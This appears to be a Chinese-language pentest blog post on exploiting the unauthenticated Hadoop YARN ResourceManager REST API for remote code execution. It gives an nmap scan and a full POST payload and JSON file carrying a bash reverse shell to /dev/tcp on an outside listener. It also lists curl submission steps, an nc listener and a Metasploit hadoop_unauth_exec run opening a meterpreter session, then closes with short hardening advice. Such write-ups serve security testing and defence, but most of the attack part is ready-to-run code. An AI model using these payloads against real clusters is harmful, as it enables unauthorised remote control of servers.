---
title: Hadoop
categories:
- [Kali, Exploit]
tags:
  - aa
date: 2020-12-04 20:23:31
top:
updated:
---

Hadoop是一个Apache基金会所开发的分布式基础架构， 核心设计是`HDFS`（即分布式文件系统）和`MapReduce`， \* HDFS 为海量数据提供存储 * MapReduce为海量数据提供计算


## 信息收集
```zsh
sudo nmap -sV -Pn -T4 -sSU -p 8088 -sC    192.168.79.207

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:32 CST
Nmap scan report for 192.168.79.207
Host is up (0.00012s latency).

PORT     STATE  SERVICE    VERSION
8088/tcp open   http       Jetty 6.1.26
|_http-server-header: Jetty(6.1.26)
| http-title:     All Applications
|_Requested resource was http://192.168.79.207:8088/cluster
8088/udp closed radan-http

Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
```


## Hadoop Yarn（ResourceManager REST API)未授权漏洞

YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当， 攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行远程执行代码。


### 手工或BP测试

Payload

```
POST /ws/v1/cluster/apps HTTP/1.1
Host: 127.0.0.1:8088
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/json
Content-Length: 268

{
   "application-id":"application_1604979684298_0006",
    "application-name":"test",
    "application-type":"YARN",
    "am-container-spec":{
        "commands":{
            "command":"/bin/bash -i >& /dev/tcp/192.168.79.28/9999  0>&1"

        }
    }
 
}
```

![hadoop-1](../images/hadoop-1.png)

1.  申请新的application，记录`application-id`字段 直接通过curl进行POST请求

```
curl -v -X POST 'http://ip:8088/ws/v1/cluster/apps/new-application'
返回包含如下信息
{"application-id":"application_1527144634877_20465","maximum-resource-capability":{"memory":16384,"vCores":8}}
```

2.  使用nc监听9999端口 `nc -lvvp 9999`
3.  直接发送构造好的payload

```
curl -s -i -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' http://ip:8088/ws/v1/cluster/apps --data-binary @1.json
```

1.json文件中的内容

```text
{
    "am-container-spec":{
        "commands":{
            "command":"/bin/bash -i >& /dev/tcp/192.168.79.28/9999  0>&1"

        }
    },
    "application-id":"application_1527144634877_20465",
    "application-name":"test",
    "application-type":"YARN"
}
```

### MSF测试

```
msf6 exploit(linux/http/hadoop_unauth_exec) > show options

Module options (exploit/linux/http/hadoop_unauth_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    8088             yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(linux/http/hadoop_unauth_exec) > run

[*] Started reverse TCP handler on 192.168.79.28:4444
[*] Sending Command
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Sending stage (3008420 bytes) to 192.168.79.28
[*] Meterpreter session 2 opened (192.168.79.28:4444 -> 192.168.79.28:63414) at 2020-11-10 15:44:07 +0800

meterpreter >
```

### 修复建议：

- 如无必要，关闭Hadoop Web管理页面；
- 开启服务级别身份验证，如Kerberos认证；
- 部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问；
- 限制可信任的IP地址才能访问Hadoop默认开放的多个端口